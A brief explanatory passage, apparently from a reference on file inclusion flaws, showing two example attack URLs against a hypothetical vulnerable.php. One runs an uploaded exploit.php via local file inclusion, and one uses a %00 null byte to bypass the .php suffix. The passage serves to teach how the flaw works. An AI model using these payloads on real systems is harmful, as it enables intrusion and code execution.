/vulnerable.php?COLOR=C:\\ftp\\upload\\exploit - Executes code from an already uploaded file called exploit.php (local file inclusion vulnerability)
/vulnerable.php?COLOR=C:\\notes.txt%00 - example using NUL meta character to remove the .php suffix, allowing access to files other than .php. (With magic_quotes_gpc enabled this limits the attack by escaping special characters, this disables the use of the NUL terminator)
